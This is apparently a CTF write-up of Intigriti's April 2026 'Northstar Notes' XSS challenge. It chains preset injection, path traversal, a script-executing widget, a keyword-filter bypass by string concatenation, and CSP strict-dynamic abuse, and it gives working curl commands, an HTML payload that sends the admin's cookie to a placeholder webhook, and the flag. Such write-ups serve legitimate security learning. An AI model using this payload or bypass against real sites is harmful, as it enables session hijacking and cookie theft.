---
layout: post
title: "Intigriti 0426 Challenge — Northstar Notes XSS"
date: 2026-04-22
category: ctf
difficulty: hard
platform: Intigriti
tags: [xss, csp-bypass, dompurify-bypass, path-traversal, web, ctf]
description: "Chaining preset-injection, path traversal, DOMPurify config weakening, and strict-dynamic CSP to land a stored XSS in Intigriti's April 2026 challenge by KonaN."
---

## The Challenge

The target is **Northstar Notes**, a note-taking app where you can create notes with rich HTML content. Notes are viewable at URLs like `/note/{noteId}/summary`. There's a "Report" button that makes an admin bot visit the current page. Our goal is to get JavaScript execution on the admin's browser and steal their cookie.

The app has three layers of defense:

1. **DOMPurify** — sanitizes note HTML before rendering
2. **A regex post-filter** — scans `data-*` attributes for dangerous keywords and strips them
3. **CSP with nonce + `strict-dynamic`** — only scripts with a valid nonce can execute

We need to break through all three. Here's how.

---

## The Code That Matters

When a note page loads, this is the execution order:

```javascript
await loadPanelManifest();     // Fetches config from server
applyTheme();
initContentEnhancements();     // Sets up the widget system
renderNoteContent();           // Sanitizes and renders note HTML
```

The key detail: **the config loads before the note is rendered**. If we can manipulate that config, we change how the sanitizer behaves.

---

## Bug 1: The Preferences API Accepts Dangerous Values

The app has a preferences API where you can save "reader presets" — display configuration profiles. The API doesn't validate what you put in a preset, so we can store a profile with settings that weaken the app's security:

```bash
curl 'https://challenge-0426.intigriti.io/api/account/preferences' \
  -X POST \
  -H 'Content-Type: application/json' \
  -b 'northstar_profile=YOUR_COOKIE' \
  --data-raw '{"readerPresets":{"challenging":{"profile":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}}}'
```

This creates a preset called `challenging` that returns:

```json
{"profile":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}
```

These three values are exactly what we need to activate the dangerous widget system. But the app doesn't load presets directly — it fetches a "panel manifest" from a different URL. We need to redirect that fetch to our preset.

---

## Bug 2: Path Traversal in the Manifest Loader

When viewing a note, the app fetches a manifest config. The URL is built like this:

```javascript
var target = '/note/' + encodeURIComponent(noteId) + '/' + panel + '/manifest.json';
```

`noteId` gets properly encoded. But `panel` is **not encoded** — it goes straight into the URL.

`panel` comes from the URL path. Visit `/note/{id}/summary` and panel is `"summary"`. The server doesn't validate it.

So if we visit:

```
/note/{id}/../../api/account/preferences/reader-presets/challenging
```

The app sets panel to `../../api/account/preferences/reader-presets/challenging` and builds this fetch URL:

```
/note/{id}/../../api/account/preferences/reader-presets/challenging/manifest.json
```

The browser resolves the `../..` (each `..` goes up one directory level), and the URL collapses to:

```
/api/account/preferences/reader-presets/challenging/manifest.json
```

That's our malicious preset from Bug 1. The app loads it and applies the config **before rendering the note**:

- `APP.renderMode` → `"full"` (was `"safe"`)
- `APP.widgetTypes` → `["custom"]`
- `APP.widgetSink` → `"script"`

This changes everything. In `"safe"` mode, DOMPurify strips `id` and `data-*` attributes. In `"full"` mode, it allows them through. And a hidden feature called "content enhancements" wakes up.

---

## Bug 3: The Widget System — A Built-In XSS Gadget

With `renderMode: "full"`, the app activates a widget system that scans rendered notes for elements with `data-enhance` attributes. One widget type is `custom`:

```javascript
function loadCustomWidget(el) {
    if (getOwnString(APP, 'widgetSink', 'text') !== 'script') return;

    var cfg = el.dataset.cfg;
    if (!cfg || cfg.length > 512) return;

    var s = document.createElement('script');
    s.textContent = cfg;
    document.head.appendChild(s);
}
```

It reads `data-cfg` from an element and **executes it as a `<script>` tag**. Thanks to Bug 2, all three gates are open — `widgetSink` is `"script"`, `widgetTypes` includes `"custom"`, and `renderMode` is `"full"` so `data-*` attributes pass through DOMPurify.

The widget system also requires an element with `id="enhance-config"` on the page. Since `"full"` mode allows `id` attributes, we can include that in our note too.

---

## Bug 4: Regex Bypass via String Concatenation

After DOMPurify, there's a second filter that checks all `data-*` attribute values against a regex:

```javascript
var UNSAFE_CONTENT_RE = /script|cookie|document|window|eval|alert|prompt|confirm|Function|fetch|XMLHttp|import|require|setTimeout|setInterval/i;
```

If a `data-*` value contains any of these words, the attribute gets removed. So `data-cfg="document.cookie"` would be stripped.

The bypass: JavaScript lets you build function and property names by concatenating strings. Instead of writing `document`, we write `'doc'+'ument'`. The regex sees `doc` and `ument` as separate fragments — it never finds the full word `document`. But when JavaScript runs the code, it joins them into `'document'` and accesses the property normally.

Same trick for every blocked word:
- `alert` → `'al'+'ert'`
- `cookie` → `'coo'+'kie'`
- `location` → `'loca'+'tion'`

We use `top` instead of `window` (which is blocked) — they refer to the same object.

---

## CSP: Why It Doesn't Stop Us

The CSP header is:

```
script-src 'nonce-RANDOM' 'strict-dynamic'
```

Our injected script has no nonce. But `strict-dynamic` says: **if a trusted script creates a new script, the new script is also trusted**.

`app.js` loads with a valid nonce, so it's trusted. When `loadCustomWidget()` runs `document.createElement('script')` and appends it, the browser sees a trusted script creating a child script and lets it execute. No nonce needed.

---

## The Full Solve

### Step 1 — Create the malicious preset

```bash
curl 'https://challenge-0426.intigriti.io/api/account/preferences' \
  -X POST \
  -H 'Content-Type: application/json' \
  -b 'northstar_profile=YOUR_COOKIE' \
  --data-raw '{"readerPresets":{"challenging":{"profile":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}}}'
```

### Step 2 — Create a note with the payload

```html
<div id="enhance-config" data-types="custom"></div>
<div data-enhance="custom" data-cfg="top['loca'+'tion']='https://YOUR-WEBHOOK-URL/?c='+top['doc'+'ument']['coo'+'kie']"></div>
```

- First div: config element the widget system needs, declaring `custom` as an allowed type
- Second div: the payload — redirects the browser to your webhook with the cookies attached

### Step 3 — Build the trigger URL

```
https://challenge-0426.intigriti.io/note/{NOTE_ID}/../../api/account/preferences/reader-presets/challenging
```

### Step 4 — Report to admin

Visit the trigger URL. Click **Report**. The admin bot opens the page.

### Step 5 — Catch the flag

The admin's browser hits your webhook:

```
https://YOUR-WEBHOOK-URL/?c=INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}
```

---

## What Happens Under the Hood

```
Step 1: Attacker creates preset → renderMode:"full", widgetSink:"script"
            │
            ▼
Step 2: Path traversal redirects manifest fetch → loads attacker's preset
            │
            ▼
Step 3: renderMode is now "full" → DOMPurify allows id + data-* attributes
            │
            ▼
Step 4: Regex sees "top['al'+'ert']" → no blocked words found → survives
            │
            ▼
Step 5: Widget system finds data-enhance="custom" → reads data-cfg
            │
            ▼
Step 6: createElement('script') + strict-dynamic → script executes
            │
            ▼
Step 7: Admin's cookie sent to attacker's webhook
```

---

## Flag

```
INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}
```
